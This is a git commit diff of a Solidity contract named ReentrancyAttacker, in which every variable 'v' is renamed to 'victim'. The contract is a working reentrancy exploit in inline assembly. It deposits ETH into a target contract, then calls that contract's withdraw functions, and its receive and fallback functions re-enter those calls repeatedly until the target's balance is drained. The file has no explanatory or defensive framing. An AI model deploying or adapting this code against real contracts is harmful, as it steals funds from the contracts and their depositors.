0c4b1c59a683010e69c10dddf669ea84efbaa0d2
anonymousperson457 <117697236+anonymousperson457@users.noreply.github.com>
2025-07-24 08:02:50 +0530

    Update ReentrancyAttacker.sol

--- ReentrancyAttacker.sol
+++ ReentrancyAttacker.sol
@@ -3,39 +3,39 @@ pragma solidity ^0.8.0;
 
 contract ReentrancyAttacker {
     
-    constructor(address v) {
-        assembly { sstore(0, v) }
+    constructor(address victim) {
+        assembly { sstore(0, victim) }
     }
     
     function attack() external payable {
         assembly {
-            let v := sload(0)
+            let victim := sload(0)
             let amount := callvalue() 
             sstore(1, amount)
             mstore(0, 0xd0e30db000000000000000000000000000000000000000000000000000000000)
-            pop(call(gas(), v, amount, 0, 4, 0, 0))
+            pop(call(gas(), victim, amount, 0, 4, 0, 0))
              mstore(0, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
-            let success1 := call(gas(), v, 0, 0, 4, 0, 0)
+            let success1 := call(gas(), victim, 0, 0, 4, 0, 0)
             if iszero(success1) {
                 mstore(0, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
                 mstore(4, amount)
-                pop(call(gas(), v, 0, 0, 36, 0, 0))
+                pop(call(gas(), victim, 0, 0, 36, 0, 0))
             }
         }
     }
     
     receive() external payable {
         assembly {
-            let v := sload(0)
+            let victim := sload(0)
             let amount := sload(1)
             
-            if gt(balance(v), 0) {
+            if gt(balance(victim), 0) {
                 mstore(0, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
-                let success1 := call(gas(), v, 0, 0, 4, 0, 0)
+                let success1 := call(gas(), victim, 0, 0, 4, 0, 0)
                 if iszero(success1) {
                     mstore(0, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
                     mstore(4, amount)
-                    pop(call(gas(), v, 0, 0, 36, 0, 0))
+                    pop(call(gas(), victim, 0, 0, 36, 0, 0))
                 }
             }
         }
@@ -43,16 +43,16 @@ contract ReentrancyAttacker {
 
     fallback() external payable {
         assembly {
-            let v := sload(0)
+            let victim := sload(0)
             let amount := sload(1)
             
-            if gt(balance(v), 0) {
+            if gt(balance(victim), 0) {
                 mstore(0, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
-                let success1 := call(gas(), v, 0, 0, 4, 0, 0)
+                let success1 := call(gas(), victim, 0, 0, 4, 0, 0)
                 if iszero(success1) {
                     mstore(0, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
                     mstore(4, amount)
-                    pop(call(gas(), v, 0, 0, 36, 0, 0))
+                    pop(call(gas(), victim, 0, 0, 36, 0, 0))
                 }
             }
         }
